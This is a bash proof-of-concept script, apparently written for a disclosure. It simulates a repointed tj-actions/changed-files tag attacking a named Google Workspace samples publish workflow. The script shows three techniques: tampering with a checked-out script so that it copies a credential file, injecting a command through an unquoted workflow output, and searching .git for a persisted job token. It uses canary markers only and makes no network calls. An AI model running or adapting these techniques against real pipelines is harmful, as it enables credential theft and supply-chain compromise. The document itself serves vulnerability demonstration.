#!/usr/bin/env bash
# PoC only — simulates what a repointed tj-actions/changed-files@v23.1 tag could do
# in the googleworkspace/apps-script-samples (or google-chat-samples) publish job.
# Harmless markers only: no network calls, no secrets leave the runner, dummy credential.

set -eu

# Sink (b): script tamper.
# clasp_push.sh is already checked out (workflow step 1) and the workflow executes it
# AFTER materializing the credential (later step). Insert a canary-capture line right
# after the shebang so it runs before the script's exit path.
sed -i '1a cp "$HOME/.clasprc.json" "$HOME/INJECTED_VIA_SCRIPT_TAMPER" || true' \
  "$GITHUB_WORKSPACE/.github/scripts/clasp_push.sh"

# Sink (a): output interpolation.
# The workflow runs, unquoted:
#   ./.github/scripts/clasp_push.sh ${{ steps.changed-files.outputs.all_changed_files }}
# (see victim-repo workflow) — so a payload in the output executes on the final step's
# command line. $HOME is written escaped so it expands at run time, not here.
echo 'all_changed_files=x; touch "$HOME/INJECTED_VIA_OUTPUT"; #' >> "$GITHUB_OUTPUT"

# Sink (c): read-only proof that the checkout's persisted job token is on disk
# somewhere under the repo's .git directory. Filenames only in the log — never
# token content.
if grep -rq 'Authorization: basic' "$GITHUB_WORKSPACE/.git" 2>/dev/null; then
  touch "$HOME/INJECTED_READ_GIT_CONFIG"
  grep -rl 'Authorization: basic' "$GITHUB_WORKSPACE/.git" 2>/dev/null | sed 's/^/persisted-credential-file: /'
fi